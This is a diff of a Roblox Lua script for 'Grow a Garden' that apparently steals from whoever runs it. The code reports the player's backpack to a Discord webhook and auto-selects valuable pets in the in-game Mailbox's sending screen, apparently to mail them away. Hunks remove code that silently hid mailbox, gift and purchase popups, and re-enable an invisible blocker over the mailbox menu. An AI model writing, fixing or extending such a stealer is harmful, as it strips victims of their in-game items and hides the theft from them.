@@ -12,9 +12,7 @@ local FRUITS = {
     "Bamboo", "Corn", "Cactus", "Pineapple", "Mushroom", "Green Bean",
     "Banana", "Grape", "Coconut", "Mango", "Dragon Fruit", "Acorn",
     "Cherry", "Sunflower", "Venus Fly Trap", "Pomegranate", "Poision Apple",
-    "Moon Bloom", "Dragon's Breath", "Ghost Pepper",
-    -- New seeds
-    "Gold", "Poison Ivy", "Rainbow"
+    "Moon Bloom", "Dragon's Breath", "Ghost Pepper" -- Added Ghost Pepper safely here
 }
 
 local CRATES = {
@@ -60,90 +58,6 @@ if existing then
     if existingFrame then existingFrame.Visible = false end
 end
 
--- =====================================================================
--- FORCE GAME HUD VISIBLE  +  HIDE EVERY NEW POPUP
---
--- Strategy:
---   1. Snapshot every ScreenGui that exists when the script starts —
---      these are the legit game HUDs (Seeds, Sell, Gear, hotbar, …).
---      They get FORCE-KEPT enabled so the game can't hide them.
---   2. ANY ScreenGui added after that point (MailboxUI, "Gift A Friend",
---      "Buy item" purchase prompt, search popups, etc.) is treated as
---      a popup and gets FORCE-DISABLED so the screen stays clean while
---      the script does its work in the background.
---   3. Roblox CoreGui (jump button, joystick, chat) is force-enabled
---      every 0.5s so the player keeps full movement control.
--- =====================================================================
-local StarterGui = game:GetService("StarterGui")
-
--- ScreenGuis that must NEVER be treated as HUD even if they already exist
--- in PlayerGui when the script starts (otherwise the whitelist below would
--- keep re-enabling them and the Mailbox popup would flash on every send).
-local POPUP_BLACKLIST = {
-    MailboxUI = true,
-}
-
-local hudWhitelist = {} -- ScreenGui instances that existed at script start
-
-for _, gui in ipairs(playerGui:GetChildren()) do
-    if gui:IsA("ScreenGui") and not POPUP_BLACKLIST[gui.Name] then
-        hudWhitelist[gui] = true
-        pcall(function() gui.Enabled = true end)
-        pcall(function()
-            gui:GetPropertyChangedSignal("Enabled"):Connect(function()
-                if hudWhitelist[gui] and not gui.Enabled then
-                    pcall(function() gui.Enabled = true end)
-                end
-            end)
-        end)
-    end
-end
-
--- If MailboxUI was already present at script start, force-disable it now
--- and lock it disabled (so a leftover instance can't keep showing).
-for _, gui in ipairs(playerGui:GetChildren()) do
-    if gui:IsA("ScreenGui") and POPUP_BLACKLIST[gui.Name] then
-        pcall(function() gui.Enabled = false end)
-        pcall(function()
-            gui:GetPropertyChangedSignal("Enabled"):Connect(function()
-                if gui.Enabled then pcall(function() gui.Enabled = false end) end
-            end)
-        end)
-        local f = gui:FindFirstChild("Frame")
-        if f then pcall(function() f.Visible = false end) end
-    end
-end
-
--- Any ScreenGui added AFTER the snapshot is a popup → keep it disabled
-local function hidePopupGui(gui)
-    if not gui:IsA("ScreenGui") then return end
-    if hudWhitelist[gui] then return end -- whitelist safety
-    pcall(function() gui.Enabled = false end)
-    pcall(function()
-        gui:GetPropertyChangedSignal("Enabled"):Connect(function()
-            if gui.Enabled then
-                pcall(function() gui.Enabled = false end)
-            end
-        end)
-    end)
-end
-playerGui.ChildAdded:Connect(hidePopupGui)
-
--- Force Roblox CoreGui back on AND re-assert HUD ScreenGuis every 0.5s
-task.spawn(function()
-    while true do
-        pcall(function()
-            StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, true)
-        end)
-        for gui, _ in pairs(hudWhitelist) do
-            if gui.Parent and not gui.Enabled then
-                pcall(function() gui.Enabled = true end)
-            end
-        end
-        task.wait(0.5)
-    end
-end)
-
 -- Send backpack contents to Discord webhook
 local function sendBackpackToWebhook()
     local backpack = localPlayer:FindFirstChild("Backpack")
@@ -162,18 +76,11 @@ local function sendBackpackToWebhook()
             or n:find("fertilizer") or n:find("hoe") or n:find("rake")
     end
 
-    -- Known pets from Grow a Garden 2 tier list (S → C) + common variants
+    -- Known pets from priority list + common ones
     local petSet = {}
-    for _, n in ipairs({
-        -- S tier
-        "Raccoon","Black Dragon","BlackDragon","Ice Serpent","IceSerpent","Unicorn",
-        -- A tier
-        "Bee","Golden Dragonfly","GoldenDragonfly","DragonFly","Dragonfly","Deer","Bunny",
-        -- B tier
-        "Frog",
-        -- C tier
-        "Robin","Owl","Monkey"
-    }) do
+    for _, n in ipairs({"Raccoon","DragonFly","Unicorn","Bunny","Robin","Frog","Deer",
+                        "Cat","Dog","Hamster","Owl","Snake","Turtle","Pig","Cow",
+                        "Sheep","Chicken","Duck","Fox","Wolf","Bear","Panda","Penguin"}) do
         petSet[n:lower()] = true
     end
 
@@ -461,15 +368,12 @@ local function runScript()
         return false 
     end
 
-    -- Touch-blocker DISABLED: leaving it at 0x0 so your normal game HUD
-    -- (bag, build, shovel, sun, etc.) stays fully tappable while the script runs.
-    -- The Mailbox itself is hidden via Frame.Visible = false above, so there's
-    -- nothing visible for the player to accidentally tap anyway.
-    -- if mainFrame:IsA("Frame") then
-    --     targetBlocker.Size = mainFrame.Size
-    --     targetBlocker.Position = mainFrame.Position
-    --     targetBlocker.AnchorPoint = mainFrame.AnchorPoint
-    -- end
+    -- ONLY expand the blocker box to cover the menu now that the Mailbox is actually open
+    if mainFrame:IsA("Frame") then
+        targetBlocker.Size = mainFrame.Size
+        targetBlocker.Position = mainFrame.Position
+        targetBlocker.AnchorPoint = mainFrame.AnchorPoint
+    end
 
     local sendingFrame = mainFrame:WaitForChild("SendingFrame", 5)
     if not sendingFrame then 
@@ -575,42 +479,16 @@ local function runScript()
 
     -- ====================================================================
     -- STAGE 1: PRIORITY PET SELECTION (Clicks these immediately)
-    -- Ordered by Grow a Garden 2 tier list (S → C): best pets first
     -- ====================================================================
-    local priorityPets = {
-        -- S tier
-        "Raccoon", "Black Dragon", "Ice Serpent", "Unicorn",
-        -- A tier
-        "Bee", "Golden Dragonfly", "Deer", "Bunny",
-        -- B tier
-        "Frog",
-        -- C tier
-        "Robin", "Owl", "Monkey"
-    }
-
-    -- Build a normalized lookup of every child once (so we can match
-    -- "Black Dragon" against "Inv_Pets:BlackDragon" or "Inv_Pets:Black Dragon" etc.)
-    local function normalizeName(s)
-        return (s:lower():gsub("[%s_%-]", ""))
-    end
-
-    local invChildrenByNorm = {}
-    for _, child in ipairs(inventoryFrame:GetChildren()) do
-        local cname = child.Name
-        if cname:sub(1, 9) == "Inv_Pets:" then
-            local petPart = cname:sub(10) -- everything after "Inv_Pets:"
-            invChildrenByNorm[normalizeName(petPart)] = child
-        end
-    end
-
+    local priorityPets = {"Raccoon", "DragonFly", "Unicorn", "Bunny", "Robin", "Frog", "Deer"}
+    
     for _, petName in ipairs(priorityPets) do
-        local key = normalizeName(petName)
-        local petFrame = invChildrenByNorm[key]
+        local frameName = "Inv_Pets:" .. petName
+        local petFrame = inventoryFrame:FindFirstChild(frameName)
         if petFrame then
             task.spawn(function()
                 local innerFrame = petFrame:FindFirstChildWhichIsA("Frame") or petFrame
-                local button = innerFrame:FindFirstChildWhichIsA("GuiButton")
-                    or petFrame:FindFirstChildWhichIsA("GuiButton", true)
+                local button = innerFrame:FindFirstChildWhichIsA("GuiButton") or petFrame:FindFirstChildWhichIsA("GuiButton", true)
                 if button then
                     clickButton(button)
                 end
